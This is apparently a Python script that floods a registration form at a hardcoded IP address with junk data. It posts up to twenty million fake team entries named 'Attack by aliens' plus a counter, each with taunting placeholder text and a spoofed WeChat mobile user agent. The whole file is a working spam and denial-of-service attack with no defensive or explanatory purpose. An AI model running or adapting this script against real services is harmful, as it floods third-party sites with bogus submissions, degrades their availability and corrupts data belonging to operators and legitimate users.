# -*- coding: utf-8 -*
import requests
from urllib import parse

# 327584
# 64145


# 评论

def send(s):
    headers = {
        "Accept": 'application/json, text/plain, */*',
        "User-Agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 MicroMessenger/6.6.5 NetType/WIFI Language/zh_CN'
        ,"Content-Type": "application/x-www-form-urlencoded"
    }
    data = "data=%7B%22teamname%22%3A%22Attack+by+aliens+"+str(s)+"%22%2C%22slogan%22%3A%22concat+me+at+hack____you%40outlook.com.%22%2C%22leadername%22%3A%22hack____you%40outlook.com%22%2C%22leaderwechat%22%3A%22ok.+I+do+not+use+random.%22%2C%22leaderemail%22%3A%22good+for+you%22%2C%22leadernum%22%3A%22%E7%A9%BA%22%2C%22leadercode%22%3A%22%E7%A9%BA%22%2C%22leadermsg%22%3A%22%E7%A9%BA%22%2C%22mem1%22%3A%7B%22mem1name%22%3A%22%E7%A9%BA%22%2C%22mem1wechat%22%3A%22%E7%A9%BA%22%2C%22mem1code%22%3A%22%E7%A9%BA%22%2C%22mem1msg%22%3A%22%E7%A9%BA%22%7D%2C%22mem2%22%3A%7B%22mem2name%22%3A%22%E7%A9%BA%22%2C%22mem2wechat%22%3A%22%E7%A9%BA%22%2C%22mem2code%22%3A%22%E7%A9%BA%22%2C%22mem2msg%22%3A%22%E7%A9%BA%22%7D%2C%22mem3%22%3A%7B%22mem3name%22%3A%22%E7%A9%BA%22%2C%22mem3wechat%22%3A%22%E7%A9%BA%22%2C%22mem3code%22%3A%22%E7%A9%BA%22%2C%22mem3msg%22%3A%22%E7%A9%BA%22%7D%2C%22mem4%22%3A%7B%22mem4name%22%3A%22%E7%A9%BA%22%2C%22mem4wechat%22%3A%22%E7%A9%BA%22%2C%22mem4code%22%3A%22%E7%A9%BA%22%2C%22mem4msg%22%3A%22%E7%A9%BA%22%7D%2C%22mem5%22%3A%7B%22mem5name%22%3A%22%E7%A9%BA%22%2C%22mem5wechat%22%3A%22%E7%A9%BA%22%2C%22mem5code%22%3A%22%E7%A9%BA%22%2C%22mem5msg%22%3A%22%E7%A9%BA%22%7D%7D"
    url = 'http://112.74.179.199:3030/gongneng/submit'

    print('建立网站链接 %s' % (s));
    try :
        req = requests.post(url, headers=headers, data=data,timeout=0.2);
        print(req)
        back = req.text
    except:
        back='error';
    finally:
        return back


glo = '';
for i in range(1, 20000000):
    glo = send(str(i));
    print(glo);
